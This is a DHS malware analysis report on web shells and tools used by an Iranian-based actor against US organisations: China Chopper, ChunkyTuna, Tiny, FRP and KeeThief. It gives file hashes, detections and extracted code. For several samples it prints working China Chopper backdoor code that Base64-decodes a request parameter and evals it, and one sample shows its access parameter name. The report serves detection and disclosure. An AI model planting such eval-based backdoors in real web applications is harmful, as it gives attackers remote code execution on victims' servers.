{
  "markdown": "\n\n\n\n\n\n\n\n\n\n\nNotification\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\nSummary\nDescription\nThe Iranian-based malicious cyber actor associated to this report is known to target industries associated to information technology, government, healthcare, financial, and insurance across the US. The threat actor has been observed exploiting several publicly known Common Vulnerabilities and Exposures (CVEs) dealing with Pulse Secure virtual private network (VPN), Citrix NetScaler, and F5 vulnerabilities. Once the actor exploits these vulnerabilities, open source web shells and/or modified versions of the web shells are used to further entrench into a victim network. The web shells are publicly known as ChunkyTuna, Tiny, and China Chopper web shells.\n\n\t\t\t\t\t\tThis product details the functionality of 18 malicious files including multiple components of the China Chopper web shell, including an application service provider (ASP) application that listens for incoming Hypertext Transfer Protocol (HTTP) connections from a remote operator. The China Chopper web shell will allow the operator to pass and execute JavaScript code on to a victim's system. The report also details additional China Chopper web shell components that allow the operator more specific command and control (C2) capabilities including the ability to enumerate directories, upload and execute additional payloads, and exfiltrate data.\n\n\t\t\t\t\t\tIn addition, a program data (PDB) file and a binary, which has been identified as a compiled version of the open source project known as \"FRP\", was also analyzed. FRP allows an adversary to tunnel various types of connections to a remote operator sitting outside of the victim's network perimeter. In addition, a PowerShell shell script was analyzed that is part of the open source project known as \"KeeThief\". This code will allow the operator to access encrypted password credentials stored by the Microsoft \"KeePass\" password management software.\n\n\t\t\t\t\t\tIt appears this adversary utilized these malicious tools to maintain persistent remote access and data exfiltration from the victim's network. The adversary may have used the \"FRP\" utility to tunnel outbound Remote Desktop Protocol (RDP) sessions, allowing persistent access to the network from outside the firewall perimeter. The China Chopper web shell also provides the persistent ability to navigate throughout the victim's network when inside the perimeter. Leveraging the \"KeeThief\" utility allows access to sensitive user password credentials and potentially the ability to pivot to user accounts outside of the victim's network.\n\n\t\t\t\t\t\tAn additional 7 files contain malicious Hypertext Preprocessor (PHP) code designed to function as malicious web shells, which were identified as ChunkyTuna and Tiny web shells. The purpose of these web shells is to accept commands and data from a remote operator, providing the operator C2 capabilities over a compromised system.\nSubmitted Files (17)\n134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13 (site.aspx)\n17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c (vti_cnf.aspx.33154034.compiled)\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea (App_Web_tcnma5bs.pdb)\n2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849 (prev_sh)\n3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c (content)\n4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756 (content)\n51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21 (df5bd34799e200951fcce77c1c0b42...)\n547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c (df5bd34799e200951fcce77c1c0b42...)\n553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f (ui-bg.aspx)\n55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c (svchost.exe)\n5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a (App_Web_tcnma5bs.0.js)\n8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3 (content)\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0 (kee.ps1)\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc (App_Web_tcnma5bs.dll)\nb36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a (tiny_webshell)\nb443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249 (df5bd34799e200951fcce77c1c0b42...)\nf7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde (dllhost.dll)\nAdditional Files (1)\n10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334 (KeeTheft.dll)\nFindings\n553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f\nTags\ntrojanwebshell\nDetails\n\n\n\nName\nui-bg.aspx\n\n\nSize\n178 bytes\n\n\nType\nASCII text, with no line terminators\n\n\nMD5\nd7b7a8c120b69166643ee05bf70b37e5\n\n\nSHA1\n2ac99374cab70f8be83c48bbf3258eae78676f65\n\n\nSHA256\n553f355f62c4419b808e078f3f71f401f187a9ac496b785e81fbf087e02dc13f\n\n\nSHA512\n8c51c9e3d3d39ec7b961482ed7fc8cde1804ef126b72fce270c6891f64f4371067a65a8be1cbab1ab3c8860a3e2ea206d274f064d54cf2605ffd7eac51fa0515\n\n\nssdeep\n3:aEwJkW9uck1SLxAdRLgyKBM2aBZBQ/tZ/LmKABXXKF2xKYA5eRtGnKRHBIwLWEDp:aEm7EnLgyKBM5Y/tZ6KCHKF2xKt5e/GY\n\n\nEntropy\n5.196436\n\n\n\nAntivirus\n\n\n\nESET\nASP/Webshell.T trojan\n\n\nSophos\nTroj/WebShel-F\n\n\nSymantec\nHacktool.Jsprat\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a small JavaScript file, which contains the following code:\n\n\t\t\t\t\t\t\u2014Begin JavaScript Code\u2014\n\t\t\t\t\t\t@ Page Language=\"Jscript\"%><%try\n\t\t\t\t\t\t{\n\t\t\t\t\t\teval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"[Redacted]\"])),\"unsafe\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch(e)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\u2014End JavaScript Code\u2014\n\n\t\t\t\t\t\tAnalysis indicates this file might serve as part of a larger application. The code within the file decodes and executes data using the JavaScript \"eval\" function. The data is attained via the JavaScript \"Request\" function indicating the data is pulled from a remote server using the HTTP protocol. It is believed this script is a component of the China Chopper web shell framework.\n134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13\nTags\ntrojanwebshell\nDetails\n\n\n\nName\nsite.aspx\n\n\nSize\n178 bytes\n\n\nType\nASCII text, with no line terminators\n\n\nMD5\n20d89fa1df155632fafb2c9fe1a6a038\n\n\nSHA1\nc9cf494475de81dae5a2c54c678b4a518f46b1fe\n\n\nSHA256\n134ef25d48b8873514f84a0922ec9d835890bda16cc7648372e014c1f90a4e13\n\n\nSHA512\nc1d485e34153c50af79e719c4100b988ba4d289578d385d0b30d2225c20b4b8f715d215f609a141030489a337ff36a89b23d4e99bf1895466122fde97e1214f0\n\n\nssdeep\n3:aEwJkW9uck1SLxAdRLgyKBM2aBZBQ/tZ/LmKABXXKF2xKYA5eRtJIIDYbwLWEDvR:aEm7EnLgyKBM5Y/tZ6KCHKF2xKt5e/f3\n\n\nEntropy\n5.201321\n\n\n\nAntivirus\n\n\n\nESET\nASP/Webshell.T trojan\n\n\nSophos\nTroj/WebShel-F\n\n\nSymantec\nHacktool.Jsprat\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a small JavaScript file, which contains the following embedded code:\n\n\t\t\t\t\t\t\u2014Begin Embedded JavaScript\u2014\n\t\t\t\t\t\tPage Language=\"Jscript\"%><%try\n\t\t\t\t\t\t{\n\t\t\t\t\t\teval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"ammashnist\"])),\"unsafe\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch(e)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\u2014End Embedded JavaScript\u2014\n\n\t\t\t\t\t\tThis script is designed to pull JavaScript from an existing \"Request Object\", Base64 decode and execute it. The contents of the retrieved JavaScript code were not available for analysis. It is believed this web shell is a component of the China Chopper web shell framework.\n17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c\nTags\nwebshell\nDetails\n\n\n\nName\nvti_cnf.aspx.33154034.compiled\n\n\nSize\n408 bytes\n\n\nType\nXML 1.0 document, UTF-8 Unicode (with BOM) text, with CRLF line terminators\n\n\nMD5\nde1cd1c54711544508d157214323af85\n\n\nSHA1\nc33a07965e06280c53e19a5d093983205433843f\n\n\nSHA256\n17f5b6d74759620f14902a5cc8bba8753df8a17da33f4ea126b98c7e2427e79c\n\n\nSHA512\n8265901a684f808c612f9cfcc486aaba923e2cf8ca7fdcd3071e786ad6030c067c4147b7b4e36bb271a5f2b36e0c3f487ceb259e2f00e6afd907ecb6df111a7a\n\n\nssdeep\n12:MMHdWFV2q6sX1rMxA0UH17I2fUQ/1OifV2q6sW6/1:JdmsvkrGOnfUcBsve/1\n\n\nEntropy\n5.120655\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a \u201c.compiled\u201d file which was generated during the compilation of an ASP.NET application. It is believed this file was generated during the compilation and execution of a China Chopper web shell application. Although this file cannot be executed, its presence may be considered an indicator of compromise. The file contains the following data.\n\n\t\t\t\t\t\t\u2014Begin Data\u2014\n\t\t\t\t\t\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t\t\t\t\t\t<preserve resultType=\"3\" virtualPath=\"/rfq/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\" hash=\"825a58a8b\" filehash=\"445bd1a9fe00\" flags=\"110000\" assembly=\"App_Web_tcnma5bs\" type=\"ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx\">\n\t\t\t\t\t\t\u00a0\u00a0\u00a0<filedeps>\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0<filedep name=\"/rfq/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\" />\n\t\t\t\t\t\t\u00a0\u00a0\u00a0</filedeps>\n\t\t\t\t\t\t</preserve>\n\t\t\t\t\t\t\u2014End Data\u2014\n5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a\nTags\nwebshell\nDetails\n\n\n\nName\nApp_Web_tcnma5bs.0.js\n\n\nSize\n8401 bytes\n\n\nType\nUTF-8 Unicode (with BOM) text, with CRLF line terminators\n\n\nMD5\n8495abfd7356f75ad7006d2ab42d4bee\n\n\nSHA1\n3736a085f9fe515dc7d12bbf2a1474bdd3d8d4d2\n\n\nSHA256\n5e0457815554574ea74b8973fc6290bd1344aac06c1318606ea4650c21081f0a\n\n\nSHA512\n8c5fec8455ad0d529030f19626b8fe55b05f6f24b4fee1378e2d6ffa7185c5f2854074cfc30518721892f39985dc5742e81f875d5469101967a62fdc26d1cb36\n\n\nssdeep\n192:VkjEVXTaaVEDAQpovRpY0NHMdWoEsxpKL:VkjEVXTaaEDAQM3NHMdJEIp4\n\n\nEntropy\n5.246768\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis application has been identified as a component of a malicious web shell. This script has been tentatively identified as a variant of the China Chopper web shell. Displayed below is the partial JavaScript application extracted from this script:\n\n\t\t\t\t\t\t\u2014Begin Partial JavaScript\u2014\n\t\t\t\t\t\tpackage ASP {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0public System.Runtime.CompilerServices.CompilerGlobalScopeAttribute()\n\t\t\t\t\t\t\u00a0\u00a0\u00a0class aspnet_client_system_web_4_0_30319__vti_cnf_aspx extends System.Web.UI.Page implements System.Web.SessionState.IRequiresSessionState, System.Web.IHttpHandler {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0private static var __initialized : boolean;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0private static var __fileDependencies : System.Object;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public System.Diagnostics.DebuggerNonUserCodeAttribute() function aspnet_client_system_web_4_0_30319__vti_cnf_aspx() {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0var dependencies : System.String[];\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0System.Web.UI.Page(this).AppRelativeVirtualPath = \"~/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\";\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx.__initialized == false)) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dependencies = new System.String[1];\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dependencies[0] = \"~/aspnet_client/system_web/4_0_30319/_vti_cnf.aspx\";\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx.__fileDependencies = this.GetWrappedFileDependencies(dependencies);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx.__initialized = true;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0this.Server.ScriptTimeout = 30000000;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0protected final function get Profile() : System.Web.Profile.DefaultProfile {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return System.Web.Profile.DefaultProfile(this.Context.Profile);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0protected override function get SupportAutoEvents() : boolean {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return false;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0protected final function get ApplicationInstance() : ASP.global_asax {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return ASP.global_asax(this.Context.ApplicationInstance);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0private final System.Diagnostics.DebuggerNonUserCodeAttribute() function __BuildControlTree(__ctrl : aspnet_client_system_web_4_0_30319__vti_cnf_aspx) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@cc_on\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@set @position(file=\"F:\\\\inetpub\\\\wwwroot\\\\\\\\aspnet_client\\\\system_web\\\\4_0_30319\\\\_vti_cnf.aspx\";line=1)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0this.InitializeCulture();\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@set @position(end)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0__ctrl.SetRenderMethodDelegate(System.Web.UI.RenderMethod(this.__Render__control1));\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0private final function __Render__control1(__w : System.Web.UI.HtmlTextWriter, parameterContainer : System.Web.UI.Control) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@cc_on\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@set @position(file=\"F:\\\\inetpub\\\\wwwroot\\\\\\\\aspnet_client\\\\system_web\\\\4_0_30319\\\\_vti_cnf.aspx\";line=1)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 try {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"[Redacted]\"])),\"unsafe\"); } catch(e) {}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//@set @position(end)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u2014End Partial JavaScript\u2014\n\n\t\t\t\t\t\tAnalysis indicates it is designed to operate as a web server and accept JavaScript code provided from a remote operator. The password utilized by the remote operator to access this web shell was redacted.\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\nTags\nwebshell\nDetails\n\n\n\nName\nApp_Web_tcnma5bs.dll\n\n\nSize\n13312 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\n18f2cf11b940a62d63fd757e20564ec6\n\n\nSHA1\n6fbd38aff374974c59ccca7efd8e1a3205c69ce9\n\n\nSHA256\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\n\nSHA512\n190c3cb0a09ce111135d0a98d10922650c28eb895583d98b2015b67e71a2131f824863cb4402d7627648aa0660ad5eaab63ed7cae8a9a54646d09340b71019d7\n\n\nssdeep\n384:4PojaxtaTXMzS/X44tIItLzxqIj3tccsJY5Ohmqw/4JHuNkLpe+k:4PojaxyXM+/X44K2\n\n\nEntropy\n5.143850\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-06-07 06:21:21-04:00\n\n\nImport Hash\ndae02f32a21e03ce65412f6e56942daa\n\n\nCompany Name\n\u00a0\n\n\nFile Description\n\u00a0\n\n\nInternal Name\nApp_Web_tcnma5bs.dll\n\n\nLegal Copyright\n\u00a0\n\n\nOriginal Filename\nApp_Web_tcnma5bs.dll\n\n\nProduct Name\n\u00a0\n\n\nProduct Version\n\u00a0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n83b4ba5ffed3f61f2c3c07cbfb9e4645\nheader\n512\n2.606561\n\n\n9f9a21c74d71b03386ee22a566a1170d\n.text\n11264\n5.517535\n\n\ncb5b712bb6ddf459a6a953c98373b5f6\n.rsrc\n1024\n2.512896\n\n\ndbd0e57bcdedc0733290c5195a01ad35\n.reloc\n512\n0.081539\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C# v7.0 / Basic .NET\n\n\n\nRelationships\n\n\n\n99344d862e...\nRelated_To\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\n\n\nDescription\nThis file is a Windows compiled .NET dynamic link library (DLL) file. It has been identified as a component of a malicious web shell. The DLL has been tentatively identified as a variant of the China Chopper web shell. This malicious DLL contains embedded malicious JavaScript code. A portion of the JavaScript code extracted from the decompiled DLL is displayed below:\n\n\t\t\t\t\t\t\u2014Begin Extracted Code\u2014\n\t\t\t\t\t\tprivate void __Render__control1(HtmlTextWriter __w, Control parameterContainer)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 // ISSUE: type reference\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 // ISSUE: type reference\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 // ISSUE: type reference\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 Microsoft.JScript.StackFrame.PushStackFrameForMethod((object) this, new JSLocalField[3]\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0new JSLocalField(nameof (__w), __typeref (HtmlTextWriter), 0),\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0new JSLocalField(nameof (parameterContainer), __typeref (Control), 1),\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0new JSLocalField(\"e:6\", __typeref (object), 2)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }, ((INeedEngine) this).GetEngine());\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 try\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0object obj1;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0try\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 object[] localVars1 = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 localVars1[0] = (object) __w;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 localVars1[1] = (object) parameterContainer;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 object obj2;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 localVars1[2] = obj2;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Eval.JScriptEvaluate((object) Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(this.Request[\"[Redacted]\"])), ((INeedEngine) this).GetEngine());\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 object[] localVars2 = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 __w = (HtmlTextWriter) localVars2[0];\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 parameterContainer = (Control) localVars2[1];\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 obj1 = localVars2[2];\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 VsaEngine engine = ((INeedEngine) this).GetEngine();\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 obj1 = Try.JScriptExceptionValue((object) ex, engine);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0object[] localVars = ((Microsoft.JScript.StackFrame) ((INeedEngine) this).GetEngine().ScriptObjectStackTop()).localVars;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0localVars[0] = (object) __w;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0localVars[1] = (object) parameterContainer;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0localVars[2] = obj1;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 finally\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0((INeedEngine) this).GetEngine().PopScriptObject();\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u2014End Extracted Code\u2014\n\n\t\t\t\t\t\tAnalysis indicates the password utilized to access this web shell by the remote actor was redacted. This implant will allow a remote operator to execute JavaScript payloads on a victim's system.\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\nTags\nwebshell\nDetails\n\n\n\nName\nApp_Web_tcnma5bs.pdb\n\n\nSize\n24064 bytes\n\n\nType\nMSVC program database ver 7.00, 512*47 bytes\n\n\nMD5\n3be9b7030389ad5e106f169fbe7b7458\n\n\nSHA1\n224448b5840b71ca07c144d3f525b8971c17d4a7\n\n\nSHA256\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\n\nSHA512\nbf8b7bc82be4803099cfe956edb2699c441705955e4d7e3822501940a8e572dafcf1906c797cea8551f3407059bad03c9196bd1432038c095f131bf88bd64bbc\n\n\nssdeep\n384:ihIBU3Xo3Z3oTTi3aljxTi3aljKITi3aljs8Ti3aljUTi3aljBTi3alj1Ti3aljb:ihIBU4Zox1fLOx5H1bX0b6UW\n\n\nEntropy\n3.924351\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n28bc161df8...\nRelated_To\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\n\n\nDescription\nThis file is a program database (PDB) file. This file correlates with compilation of the application named \"App_Web_tcnma5bs.dll\"(99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc). Although this file cannot be executed, its presence may be considered an indicator of compromise. Strings of interest extracted from this PDB life are displayed below:\n\n\t\t\t\t\t\t\u2014Begin Strings of Interest\u2014\n\t\t\t\t\t\tF:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\n\t\t\t\t\t\tf:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\n\t\t\t\t\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\t\t\t\t\t\tc:\\windows\\microsoft.net\\framework64\\v4.0.30319\\config\\web.config\n\n\t\t\t\t\t\t.ctor\n\t\t\t\t\t\tGlobal 